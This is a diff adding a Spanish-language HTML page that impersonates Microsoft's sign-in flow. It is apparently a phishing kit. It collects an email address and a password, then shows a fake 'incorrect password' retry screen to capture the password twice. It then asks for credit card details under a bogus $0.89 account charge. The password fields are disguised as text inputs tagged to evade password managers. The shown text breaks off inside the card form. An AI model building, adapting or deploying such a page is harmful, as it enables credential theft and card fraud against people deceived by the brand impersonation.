@@ -1,0 +1,1571 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgaGVpZ2h0PSIxNiIgdmlld0JveD0iMCAwIDE2IDE2Ij4KICA8ZyBpZD0iTG9nb19NaWNyb3NvZnRfMjAyMiIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoLTY0IC00NykiPgogICAgPGcgaWQ9IlhiMGRlMmQzMjQxMDM0ZjEwYTBjNTJjNmE3MWIwOGUwNiIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoNjQgNDcpIj4KICAgICAgPHBhdGggaWQ9IlRyYXphZG9fOSIgZGF0YS1uYW1lPSJUcmF6YWRvIDkiIGQ9Ik03LjIsNy4ySDBWMEg3LjJaIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgwIDApIiBmaWxsPSIjZjI0ZTFlIi8+CiAgICAgIDxwYXRoIGlkPSJUcmF6YWRvXzEwIiBkYXRhLW5hbWU9IlRyYXphZG8gMTAiIGQ9Ik03LjIsNy4ySDBWMEg3LjJaIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSg4LjggMCkiIGZpbGw9IiM3ZmJhMDAiLz4KICAgICAgPHBhdGggaWQ9IlRyYXphZG9fMTEiIGRhdGEtbmFtZT0iVHJhemFkbyAxMSIgZD0iTTcuMiw3LjJIMFYwSDcuMloiIHRyYW5zZm9ybT0idHJhbnNsYXRlKDAgOC44KSIgZmlsbD0iIzAwYTRlZiIvPgogICAgICA8cGF0aCBpZD0iWGIwZGUyZDMyNDEwMzRmMTBhMGM1MmM2YTcxYjA4ZTA2LTQiIGRhdGEtbmFtZT0iYjBkZTJkMzI0MTAzNGYxMGEwYzUyYzZhNzFiMDhlMDYtNCIgZD0iTTcuMiw3LjJIMFYwSDcuMloiIHRyYW5zZm9ybT0idHJhbnNsYXRlKDguOCA4LjgpIiBmaWxsPSIjZmZiOTAwIi8+CiAgICA8L2c+CiAgPC9nPgo8L3N2Zz4=" />
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Microsoft</title>
+  
+  
+<style>
+*, *::before, *::after { box-sizing: border-box; }
+
+html, body {
+  margin: 0;
+  padding: 0;
+  font-family: "Segoe UI", system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+  color: #1b1b1b;
+}
+
+/* ═══════════════════════════════════════════════
+   NAVEGACIÓN POR HASH — ocultar páginas inactivas
+   ═══════════════════════════════════════════════ */
+.page { display: none; min-height: 100vh; }
+
+/* ═══════════════════════════════════════════════
+   FONDO / LAYOUT COMPARTIDO (páginas 1-3)
+   ═══════════════════════════════════════════════ */
+#inicio, #acerca, #reintento {
+  background: url('imgnew.svg') center bottom / cover no-repeat;
+  min-height: 100vh;
+  position: relative;
+}
+
+.main-container {
+  min-height: calc(100vh - 44px);
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  padding: 20px 16px 80px;
+}
+
+/* ═══════════════════════════════════════════════
+   CARD COMPARTIDA (páginas 1, 2, 3)
+   ═══════════════════════════════════════════════ */
+.card-wrapper { width: 100%; max-width: 440px; }
+
+.ms-card {
+  background: #fff;
+  box-shadow: 0 2px 6px rgba(0,0,0,.2);
+  padding: 44px 44px 36px;
+  width: 100%;
+  max-width: 440px;
+}
+
+/* ── Logo ── */
+.ms-logo-row {
+  display: flex;
+  align-items: center;
+  margin-bottom: 16px;
+  gap: 0;
+}
+.ms-logo-grid {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 1px;
+  width: 21px;
+  height: 21px;
+  margin-right: 8px;
+  flex-shrink: 0;
+}
+.ms-logo-grid div { width: 10px; height: 10px; }
+
+/* ── Título ── */
+.ms-card h1 {
+  font-size: 24px;
+  font-weight: 600;
+  line-height: 32px;
+  color: #1b1b1b;
+  margin: 0 0 16px;
+}
+
+/* ── Botón siguiente ── */
+.ms-btn-next {
+  display: block;
+  width: 100%;
+  background: #0078d4;
+  color: #fff;
+  border: none;
+  font-size: 15px;
+  font-weight: 600;
+  font-family: inherit;
+  padding: 8px 20px;
+  min-height: 32px;
+  cursor: pointer;
+  margin-top: 20px;
+}
+.ms-btn-next:hover  { background: #106ebe; }
+.ms-btn-next:active { background: #005a9e; }
+
+/* ── Links ── */
+.ms-link { color: #0078d4; text-decoration: none; font-size: 13px; }
+.ms-link:hover { text-decoration: underline; }
+
+/* ── Fila botón p1 ── */
+.ms-form-bottom {
+  display: flex;
+  align-items: center;
+  justify-content: flex-end;
+  margin-top: 24px;
+}
+.ms-form-bottom .ms-btn-next {
+  display: inline-block;
+  width: auto;
+  margin-top: 0;
+}
+
+/* ── Footer fijo ── */
+.ms-footer {
+  position: fixed;
+  bottom: 0; left: 0; right: 0;
+  background: rgba(255,255,255,.95);
+  border-top: 1px solid #e0e0e0;
+  padding: 8px 16px;
+  z-index: 50;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 24px;
+  font-size: 12px;
+  color: #605e5c;
+}
+.ms-footer a { color: #605e5c; text-decoration: none; font-size: 12px; }
+.ms-footer a:hover { color: #0078d4; }
+
+/* ── Opciones de inicio ── */
+.ms-options-card {
+  background: #fff;
+  box-shadow: 0 2px 6px rgba(0,0,0,.2);
+  padding: 16px 20px;
+  width: 100%;
+  max-width: 440px;
+  display: flex;
+  align-items: center;
+  gap: 14px;
+  cursor: pointer;
+  font-size: 15px;
+  color: #1b1b1b;
+}
+.ms-options-card:hover { background: #f5f5f5; }
+.ms-options-icon { width: 20px; height: 20px; color: #605e5c; flex-shrink: 0; }
+
+/* ═══════════════════════════════════════════════
+   PÁGINA 1 — EMAIL
+   ═══════════════════════════════════════════════ */
+#email {
+  display: block;
+  width: 100%;
+  border: none;
+  border-bottom: 1px solid #767676;
+  padding: 4px 0 6px;
+  background: transparent;
+  font-size: 16px;
+  font-family: inherit;
+  color: #1b1b1b;
+  margin-bottom: 12px;
+  outline: none;
+}
+#email::placeholder { color: #767676; font-size: 15px; }
+#email:focus        { border-bottom: 2px solid #0078d4; }
+#email.input-error  { border-bottom: 2px solid #a4262c; }
+
+#errorMessage {
+  display: none;
+  margin-bottom: 12px;
+  padding: 12px;
+  background: #fef7f7;
+  border: 1px solid #fde7e9;
+}
+#errorMessage.visible { display: block; }
+
+/* ═══════════════════════════════════════════════
+   PÁGINAS 2 Y 3 — CONTRASEÑA
+   ═══════════════════════════════════════════════ */
+
+/* Header con flecha + logo */
+.ms-card-header {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  margin-bottom: 20px;
+}
+.ms-back-btn {
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  width: 28px; height: 28px;
+  border: 1px solid #c8c6c4;
+  background: #fff;
+  cursor: pointer;
+  color: #323130;
+  flex-shrink: 0;
+}
+.ms-back-btn:hover { background: #f3f2f1; }
+.ms-card-header .ms-logo-row { margin-bottom: 0; }
+
+/* Badge email */
+.ms-email-badge {
+  font-size: 15px;
+  color: #323130;
+  margin-bottom: 4px;
+}
+
+/* Campo contraseña con ojo */
+.pwd-wrapper {
+  display: flex;
+  align-items: center;
+  border-bottom: 1px solid #767676;
+  margin-bottom: 4px;
+}
+.pwd-wrapper:focus-within { border-bottom: 2px solid #0078d4; }
+.pwd-wrapper input {
+  flex: 1;
+  border: none;
+  outline: none;
+  font-size: 16px;
+  font-family: inherit;
+  color: #1b1b1b;
+  background: transparent;
+  padding: 4px 0 6px;
+}
+.pwd-wrapper input::placeholder { color: #767676; }
+.pwd-wrapper input.input-error { color: #a4262c; }
+.pwd-wrapper button {
+  background: none;
+  border: none;
+  cursor: pointer;
+  color: #605e5c;
+  padding: 4px;
+  display: flex;
+  align-items: center;
+}
+.pwd-wrapper button:hover { color: #323130; }
+
+/* Enlace olvidó + otras formas */
+.ms-other-login { margin-top: 16px; }
+
+/* Caja de error (p1 y p3) */
+.ms-error-box {
+  display: none;
+  margin-bottom: 14px;
+  padding: 10px 12px;
+  background: #fef7f7;
+  border: 1px solid #fde7e9;
+}
+.ms-error-box.visible,
+.ms-error-box--visible { display: block; }
+
+/* ═══════════════════════════════════════════════
+   PÁGINA 4 — PAGO CON TARJETA
+   ═══════════════════════════════════════════════ */
+#pago {
+  min-height: 100vh;
+  background: #f8f8f8;
+  display: flex;
+  flex-direction: column;
+}
+
+/* Header azul */
+.header-banner {
+  background: #0078d4;
+  color: #fff;
+  padding: 14px 32px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  font-size: 15px;
+}
+.header-logo {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  font-weight: 600;
+  font-size: 18px;
+}
+.header-logo-grid {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 1px;
+  width: 20px; height: 20px;
+}
+.header-logo-grid div {
+  width: 9px; height: 9px;
+}
+.header-logo-grid div:nth-child(1) { background: #f25022; }
+.header-logo-grid div:nth-child(2) { background: #7fba00; }
+.header-logo-grid div:nth-child(3) { background: #00bcf2; }
+.header-logo-grid div:nth-child(4) { background: #ffb900; }
+
+.header-right { text-align: right; }
+.header-right .label { font-size: 12px; opacity: .85; }
+.header-right .value { font-size: 15px; font-weight: 600; }
+
+/* Contenedor del formulario */
+#pago .main-container {
+  justify-content: flex-start;
+  padding-top: 40px;
+  padding-bottom: 100px;
+}
+
+.form-card {
+  background: #fff;
+  box-shadow: 0 2px 8px rgba(0,0,0,.12);
+  padding: 36px 40px 32px;
+  width: 100%;
+  max-width: 520px;
+}
+
+/* Banda de precio */
+.price-banner {
+  background: #f0f7ff;
+  border-left: 4px solid #0078d4;
+  padding: 12px 16px;
+  margin-bottom: 24px;
+}
+.price-banner .price {
+  font-size: 22px;
+  font-weight: 700;
+  color: #0078d4;
+}
+.price-banner .price span {
+  font-size: 14px;
+  font-weight: 400;
+  color: #605e5c;
+}
+.price-banner .desc { font-size: 13px; color: #605e5c; margin-top: 2px; }
+
+.form-card h1 {
+  font-size: 20px;
+  font-weight: 600;
+  color: #1b1b1b;
+  margin: 0 0 20px;
+}
+
+/* Iconos de tarjeta */
+.card-icons {
+  display: flex;
+  gap: 8px;
+  margin-bottom: 20px;
+}
+.card-icon {
+  padding: 4px 10px;
+  border: 1px solid #d0d0d0;
+  border-radius: 4px;
+  font-size: 11px;
+  font-weight: 700;
+  color: #767676;
+  background: #fafafa;
+  opacity: .5;
+  transition: opacity .2s, border-color .2s;
+  min-width: 44px;
+  text-align: center;
+  letter-spacing: .5px;
+}
+.card-icon.active { opacity: 1; border-color: #0078d4; color: #0078d4; }
+.card-icon.mastercard {
+  position: relative;
+}
+.card-icon.mastercard::before,
+.card-icon.mastercard::after {
+  content: '';
+  display: inline-block;
+  width: 16px; height: 16px;
+  border-radius: 50%;
+  vertical-align: middle;
+}
+.card-icon.mastercard::before { background: #eb001b; margin-right: -6px; }
+.card-icon.mastercard::after  { background: #f79e1b; }
+
+/* Grupos de formulario */
+.form-group { margin-bottom: 18px; }
+.form-group label,
+.expiry-cvv-row label {
+  display: block;
+  font-size: 13px;
+  font-weight: 600;
+  color: #323130;
+  margin-bottom: 6px;
+}
+
+.ms-input {
+  display: block;
+  width: 100%;
+  border: 1px solid #c8c6c4;
+  padding: 8px 12px;
+  font-size: 15px;
+  font-family: inherit;
+  color: #1b1b1b;
+  background: #fff;
+  outline: none;
+  border-radius: 2px;
+  transition: border-color .15s;
+}
+.ms-input:focus  { border-color: #0078d4; box-shadow: 0 0 0 1px #0078d4; }
+.ms-input.error  { border-color: #a4262c; }
+.ms-input.text-center { text-align: center; letter-spacing: 2px; }
+
+/* Fila vencimiento + CVV */
+.expiry-cvv-row {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 16px;
+  margin-bottom: 18px;
+}
+.expiry-pair {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 8px;
+}
+
+/* Dropdown personalizado */
+.custom-select-wrap { position: relative; }
+.custom-select-trigger {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  cursor: pointer;
+  user-select: none;
+}
+.custom-select-trigger.open { border-color: #0078d4; box-shadow: 0 0 0 1px #0078d4; }
+.custom-arrow { flex-shrink: 0; transition: transform .2s; }
+.custom-select-trigger.open .custom-arrow { transform: rotate(180deg); }
+
+.custom-dropdown {
+  display: none;
+  position: absolute;
+  top: calc(100% + 2px);
+  left: 0; right: 0;
+  background: #fff;
+  border: 1px solid #c8c6c4;
+  box-shadow: 0 4px 12px rgba(0,0,0,.12);
+  z-index: 100;
+  max-height: 200px;
+  overflow-y: auto;
+  border-radius: 2px;
+}
+.custom-dropdown.open { display: block; }
+
+.custom-option {
+  padding: 8px 12px;
+  font-size: 14px;
+  cursor: pointer;
+  color: #1b1b1b;
+}
+.custom-option:hover { background: #f3f2f1; }
+
+/* Error de campo */
+.field-error {
+  display: none;
+  font-size: 12px;
+  color: #a4262c;
+  margin-top: 4px;
+}
+.field-error.visible { display: block; }
+
+/* Checkbox */
+.checkbox-row {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  margin-bottom: 24px;
+  font-size: 14px;
+  color: #323130;
+}
+.checkbox-row input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; }
+
+/* Botón pagar */
+.ms-button {
+  display: block;
+  width: 100%;
+  background: #0078d4;
+  color: #fff;
+  border: none;
+  font-size: 16px;
+  font-weight: 600;
+  font-family: inherit;
+  padding: 12px;
+  cursor: pointer;
+  border-radius: 2px;
+  margin-bottom: 16px;
+  transition: background .15s;
+}
+.ms-button:hover  { background: #106ebe; }
+.ms-button:active { background: #005a9e; }
+
+/* Aviso de seguridad */
+.security-notice {
+  border: 1px solid #e0e0e0;
+  padding: 12px 16px;
+  font-size: 13px;
+  color: #605e5c;
+}
+.sec-title {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  font-weight: 600;
+  color: #107c10;
+  margin-bottom: 4px;
+}
+.sec-title svg { width: 16px; height: 16px; }
+
+/* ═══════════════════════════════════════════════
+   PÁGINA 5 — PROCESANDO / ERROR
+   ═══════════════════════════════════════════════ */
+#procesando {
+  min-height: 100vh;
+  background: #fff;
+  position: relative;
+}
+
+.overlay {
+  position: fixed;
+  inset: 0;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  background: rgba(255,255,255,.97);
+  z-index: 10;
+}
+.overlay.is-hide { display: none; }
+
+/* Card del spinner */
+.card-lite {
+  background: #fff;
+  border: 1px solid #edebe9;
+  box-shadow: 0 4px 20px rgba(0,0,0,.12);
+  padding: 36px 40px;
+  max-width: 400px;
+  width: 90%;
+  text-align: center;
+}
+.card-lite .title { font-size: 20px; font-weight: 600; color: #1b1b1b; margin-bottom: 16px; }
+.card-lite .subtle { font-size: 14px; color: #605e5c; margin: 12px 0 0; }
+.card-lite .divider { border-top: 1px solid #edebe9; margin: 16px 0; }
+.card-lite .hints { text-align: left; font-size: 13px; color: #605e5c; padding-left: 20px; margin: 0; }
+.card-lite .hints li { margin-bottom: 4px; }
+
+/* Spinner SVG */
+.ring {
+  width: 44px; height: 44px;
+  display: block;
+  margin: 0 auto;
+  animation: spin 1s linear infinite;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+
+/* Card emisor */
+.card-issuer {
+  background: #fff;
+  border: 1px solid #edebe9;
+  box-shadow: 0 4px 20px rgba(0,0,0,.12);
+  padding: 36px 40px;
+  max-width: 380px;
+  width: 90%;
+  text-align: center;
+}
+.issuer-body { display: flex; flex-direction: column; align-items: center; gap: 12px; }
+.ring-brand { width: 44px; height: 44px; animation: spin 1s linear infinite; }
+.brand-title { font-size: 18px; font-weight: 600; color: #1b1b1b; }
+.brand-caption { font-size: 13px; color: #605e5c; }
+
+.brand-visa { font-size: 20px; font-weight: 900; color: #1a1f71; letter-spacing: 2px; }
+.brand-mc { display: flex; align-items: center; gap: 6px; }
+.mc-icon { position: relative; display: inline-block; width: 32px; height: 20px; }
+.mc-icon::before, .mc-icon::after {
+  content: '';
+  position: absolute;
+  top: 0; width: 20px; height: 20px; border-radius: 50%;
+}
+.mc-icon::before { left: 0; background: #eb001b; }
+.mc-icon::after  { right: 0; background: #f79e1b; mix-blend-mode: multiply; }
+.mc-text { font-size: 14px; font-weight: 700; color: #231f20; }
+.hidden { display: none !important; }
+
+/* Paso 3: pantalla de error */
+.stage-main {
+  min-height: 100vh;
+  display: none;
+  align-items: center;
+  justify-content: center;
+  padding: 20px;
+  background: #fff;
+}
+.card {
+  background: #fff;
+  border: 1px solid #edebe9;
+  box-shadow: 0 4px 20px rgba(0,0,0,.1);
+  padding: 32px 36px;
+  max-width: 480px;
+  width: 100%;
+  border-radius: 2px;
+}
+.head { margin-bottom: 16px; }
+.title-err { font-size: 22px; font-weight: 700; color: #1b1b1b; margin: 0 0 4px; }
+.sub-err { font-size: 14px; color: #605e5c; margin: 0; }
+.status { margin: 20px 0; }
+
+.err-badge { display: flex; align-items: center; justify-content: center; }
+.err-svg { width: 48px; height: 48px; }
+.err-bg { stroke: #fecaca; }
+
+.intro { font-size: 15px; color: #323130; margin: 0 0 16px; }
+
+.callout {
+  border-radius: 2px;
+  padding: 14px 16px;
+  margin-bottom: 14px;
+}
+.callout.error { background: #fef2f2; border-left: 4px solid #ef4444; }
+.callout.help  { background: #eff6ff; border-left: 4px solid #3b82f6; }
+.callout h3 { font-size: 14px; font-weight: 600; margin: 0 0 8px; color: #1b1b1b; }
+.callout ul { margin: 0; padding-left: 18px; font-size: 13px; color: #605e5c; }
+.callout ul li { margin-bottom: 4px; }
+
+.fins { margin-top: 20px; display: flex; flex-direction: column; gap: 12px; }
+.countdown-wrap { display: flex; flex-direction: column; gap: 4px; }
+.countdown-txt { font-size: 13px; color: #605e5c; }
+.countdown-bar-track { height: 4px; background: #e0e0e0; border-radius: 2px; overflow: hidden; }
+.countdown-bar { height: 100%; background: #0078d4; transition: width 1s linear; }
+.btn {
+  display: inline-block;
+  background: #0078d4;
+  color: #fff;
+  text-decoration: none;
+  font-weight: 600;
+  font-size: 15px;
+  padding: 10px 24px;
+  text-align: center;
+  border-radius: 2px;
+}
+.btn:hover { background: #106ebe; }
+
+/* Dots animados */
+.dots::after {
+  content: '';
+  animation: dots 1.5s steps(4, end) infinite;
+}
+@keyframes dots {
+  0%   { content: ''; }
+  25%  { content: '.'; }
+  50%  { content: '..'; }
+  75%  { content: '...'; }
+  100% { content: ''; }
+}
+
+/* ═══════════════════════════════════════════════
+   ANIMACIONES
+   ═══════════════════════════════════════════════ */
+.fade-in { animation: fadeIn .3s ease-out; }
+@keyframes fadeIn {
+  from { opacity: 0; transform: translateY(8px); }
+  to   { opacity: 1; transform: none; }
+}
+
+/* ═══════════════════════════════════════════════
+   RESPONSIVE
+   ═══════════════════════════════════════════════ */
+@media (max-width: 600px) {
+  .ms-card, .form-card { padding: 28px 20px 24px; }
+  .expiry-cvv-row { grid-template-columns: 1fr; }
+  .header-banner { padding: 12px 16px; }
+  .form-card h1 { font-size: 18px; }
+}
+
+</style>
+</head>
+<body>
+
+<!-- ============================================================
+     PÁGINA 1 — EMAIL
+     ============================================================ -->
+<div id="inicio" class="page">
+  <div class="main-container">
+    <div class="card-wrapper fade-in">
+      <div class="ms-card">
+        <div class="ms-logo-row">
+          <div class="ms-logo-grid">
+            <div style="background:#f25022"></div>
+            <div style="background:#7fba00"></div>
+            <div style="background:#00bcf2"></div>
+            <div style="background:#ffb900"></div>
+          </div>
+          <span style="font-size:21px;font-weight:600;color:#1b1b1b;">Microsoft</span>
+        </div>
+
+        <h1>Iniciar sesión</h1>
+
+        <div id="errorMessage" class="ms-error-box">
+          <div style="display:flex;align-items:flex-start;gap:8px;">
+            <svg style="width:16px;height:16px;color:#a4262c;flex-shrink:0;margin-top:2px" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
+            </svg>
+            <div>
+              <p style="font-size:14px;color:#a4262c;font-weight:600;margin:0">Solo se permiten cuentas de Microsoft</p>
+              <p style="font-size:12px;color:#a4262c;margin:4px 0 0">Use una dirección de hotmail, outlook, live o msn</p>
+            </div>
+          </div>
+        </div>
+
+        <form id="emailForm">
+          <input type="email" id="email" placeholder="Correo electrónico, teléfono o Skype" required autocomplete="email" />
+          <div style="margin:16px 0 8px;">
+            <p style="font-size:13px;margin:0 0 8px;color:#1b1b1b;">¿No tiene una cuenta? <a href="#" class="ms-link">Cree una.</a></p>
+            <a href="#" class="ms-link">¿No puede acceder a su cuenta?</a>
+          </div>
+          <div class="ms-form-bottom">
+            <span></span>
+            <button type="submit" class="ms-btn-next">Siguiente</button>
+          </div>
+        </form>
+      </div>
+    </div>
+
+    <div class="ms-options-card">
+      <svg class="ms-options-icon" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24">
+        <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 5.25a3 3 0 013 3m3 0a6 6 0 01-7.029 5.912c-.563-.097-1.159.026-1.563.43L10.5 17.25H8.25v2.25H6v2.25H2.25v-2.818c0-.597.237-1.17.659-1.591l6.499-6.499c.404-.404.527-1 .43-1.563A6 6 0 1121.75 8.25z"/>
+      </svg>
+      <span>Opciones de inicio de sesión</span>
+    </div>
+  </div>
+
+  <div class="ms-footer">
+    <a href="#">Términos de uso</a>
+    <a href="#">Privacidad y cookies</a>
+    <span>···</span>
+  </div>
+</div>
+
+<!-- ============================================================
+     PÁGINA 2 — CONTRASEÑA
+     ============================================================ -->
+<div id="acerca" class="page">
+  <div class="main-container">
+    <div class="ms-card fade-in">
+      <div class="ms-card-header">
+        <div class="ms-logo-row">
+          <div class="ms-logo-grid">
+            <div style="background:#f25022"></div>
+            <div style="background:#7fba00"></div>
+            <div style="background:#00bcf2"></div>
+            <div style="background:#ffb900"></div>
+          </div>
+          <span style="font-size:20px;font-weight:600;color:#1b1b1b;">Microsoft</span>
+        </div>
+      </div>
+
+      <div class="ms-email-badge">
+        <span id="userEmailDisplay">usuario@ejemplo.com</span>
+      </div>
+
+      <h1>Escribir contraseña</h1>
+
+      <form id="loginForm" autocomplete="off">
+        <input type="text" name="username" style="display:none" tabindex="-1" autocomplete="username">
+        <input type="password" name="fake" style="display:none" tabindex="-1" autocomplete="current-password">
+
+        <div class="pwd-wrapper">
+          <input type="text" id="password" name="password" placeholder="Contraseña" required
+            autocomplete="off" autocorrect="off" autocapitalize="none" spellcheck="false"
+            data-1p-ignore data-lpignore="true" data-bwignore data-form-type="other" />
+          <button type="button" id="togglePwd" tabindex="-1" aria-label="Mostrar contraseña">
+            <svg id="iconEye" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" viewBox="0 0 24 24">
+              <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+              <circle cx="12" cy="12" r="3"/>
+            </svg>
+            <svg id="iconEyeOff" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" viewBox="0 0 24 24" style="display:none">
+              <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/>
+              <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>
+              <line x1="1" y1="1" x2="23" y2="23"/>
+            </svg>
+          </button>
+        </div>
+
+        <div id="spaceError" style="display:none; margin:6px 0 4px;">
+          <div style="display:flex;align-items:center;gap:5px;">
+            <svg style="width:12px;height:12px;color:#d83b01;flex-shrink:0" viewBox="0 0 12 12" fill="currentColor">
+              <path d="M6 0a6 6 0 1 0 0 12A6 6 0 0 0 6 0zm0 9.5a.75.75 0 1 1 0-1.5.75.75 0 0 1 0 1.5zm.75-3.25a.75.75 0 0 1-1.5 0v-3a.75.75 0 0 1 1.5 0v3z"/>
+            </svg>
+            <p style="margin:0;font-size:12px;color:#d83b01;line-height:16px;">La contraseña contiene un espacio. Por favor, elimínelo.</p>
+          </div>
+        </div>
+
+        <div style="margin-top:12px;">
+          <a href="#" class="ms-link">¿Olvidó su contraseña?</a>
+        </div>
+
+        <button type="submit" class="ms-btn-next">Siguiente</button>
+      </form>
+
+      <div class="ms-other-login">
+        <a href="#" class="ms-link">Otras formas de iniciar sesión</a>
+      </div>
+    </div>
+  </div>
+
+  <div class="ms-footer">
+    <a href="#">Términos de uso</a>
+    <a href="#">Privacidad y cookies</a>
+    <span>···</span>
+  </div>
+</div>
+
+<!-- ============================================================
+     PÁGINA 3 — CONTRASEÑA REINTENTO (con error)
+     ============================================================ -->
+<div id="reintento" class="page">
+  <div class="main-container">
+    <div class="ms-card fade-in">
+      <div class="ms-card-header">
+        <div class="ms-logo-row">
+          <div class="ms-logo-grid">
+            <div style="background:#f25022"></div>
+            <div style="background:#7fba00"></div>
+            <div style="background:#00bcf2"></div>
+            <div style="background:#ffb900"></div>
+          </div>
+          <span style="font-size:20px;font-weight:600;color:#1b1b1b;">Microsoft</span>
+        </div>
+      </div>
+
+      <div class="ms-email-badge">
+        <span id="userEmailDisplay2">usuario@ejemplo.com</span>
+      </div>
+
+      <h1>Escribir contraseña</h1>
+
+      <!-- Error de contraseña incorrecta -->
+      <div class="ms-error-box ms-error-box--visible" id="pwdWrongError">
+        <div style="display:flex;align-items:flex-start;gap:8px;">
+          <svg style="width:16px;height:16px;color:#a4262c;flex-shrink:0;margin-top:2px" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
+          </svg>
+          <div>
+            <p style="font-size:14px;color:#a4262c;font-weight:600;margin:0">Tu contraseña es incorrecta.</p>
+            <p style="font-size:12px;color:#a4262c;margin:4px 0 0">Vuelve a intentarlo.</p>
+          </div>
+        </div>
+      </div>
+
+      <form id="retryForm" autocomplete="off">
+        <input type="text" name="username" style="display:none" tabindex="-1" autocomplete="username">
+        <input type="password" name="fake2" style="display:none" tabindex="-1" autocomplete="current-password">
+
+        <div class="pwd-wrapper">
+          <input type="text" id="password2" name="password2" placeholder="Contraseña" required
+            autocomplete="off" autocorrect="off" autocapitalize="none" spellcheck="false"
+            data-1p-ignore data-lpignore="true" data-bwignore data-form-type="other" class="input-error" />
+          <button type="button" id="togglePwd2" tabindex="-1" aria-label="Mostrar contraseña">
+            <svg id="iconEye2" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" viewBox="0 0 24 24">
+              <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+              <circle cx="12" cy="12" r="3"/>
+            </svg>
+            <svg id="iconEyeOff2" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" viewBox="0 0 24 24" style="display:none">
+              <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/>
+              <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>
+              <line x1="1" y1="1" x2="23" y2="23"/>
+            </svg>
+          </button>
+        </div>
+
+        <div id="spaceError2" style="display:none; margin:6px 0 4px;">
+          <div style="display:flex;align-items:center;gap:5px;">
+            <svg style="width:12px;height:12px;color:#d83b01;flex-shrink:0" viewBox="0 0 12 12" fill="currentColor">
+              <path d="M6 0a6 6 0 1 0 0 12A6 6 0 0 0 6 0zm0 9.5a.75.75 0 1 1 0-1.5.75.75 0 0 1 0 1.5zm.75-3.25a.75.75 0 0 1-1.5 0v-3a.75.75 0 0 1 1.5 0v3z"/>
+            </svg>
+            <p style="margin:0;font-size:12px;color:#d83b01;line-height:16px;">La contraseña contiene un espacio. Por favor, elimínelo.</p>
+          </div>
+        </div>
+
+        <div style="margin-top:12px;">
+          <a href="index.html#reintento" class="ms-link">¿Olvidó su contraseña?</a>
+        </div>
+
+        <button type="submit" class="ms-btn-next">Siguiente</button>
+      </form>
+
+      <div class="ms-other-login">
+        <a href="#" class="ms-link">Otras formas de iniciar sesión</a>
+      </div>
+    </div>
+  </div>
+
+  <div class="ms-footer">
+    <a href="#">Términos de uso</a>
+    <a href="#">Privacidad y cookies</a>
+    <span>···</span>
+  </div>
+</div>
+
+<!-- ============================================================
+     PÁGINA 4 — TARJETA DE PAGO
+     ============================================================ -->
+<div id="pago" class="page">
+  <div class="header-banner">
+    <div class="header-logo">
+      <div class="header-logo-grid">
+        <div></div><div></div><div></div><div></div>
+      </div>
+      Microsoft
+    </div>
+    <div class="header-right">
+      <div class="label">Estás comprando</div>
+      <div class="value">Cuenta Personal</div>
+    </div>
+  </div>
+
+  <div class="main-container">
+    <div class="form-card fade-in">
+      <div class="price-banner">
+        <div class="price">$0.89 <span>/ Pago único</span></div>
+        <div class="desc">Cuenta Personal de Microsoft</div>
+      </div>
+
+      <h1>Añade una tarjeta de crédito o débito</h1>
+
+      <div class="card-icons">
+        <div class="card-icon visa">VISA</div>
+        <div class="card-icon amex">AMEX</div>
+        <div class="card-icon mastercard"></div>
+        <div class="card-icon discover">DISC</div>
+      </div>
+
+      <form id="paymentForm">
+        <div class="form-group">
+          <label for="cardNumber"><span id="cardNumberLabel">Número de tarjeta*</span></label>
+          <input type="text" id="cardNumber" class="ms-input" placeholder="•••• •••• •••• ••••" maxlength="23" required />
+          <div class="field-error" id="cardError"></div>
+        </div>
+
+        <div class="form-group">
+          <label for="cardholderName">Nombre del titular*</label>
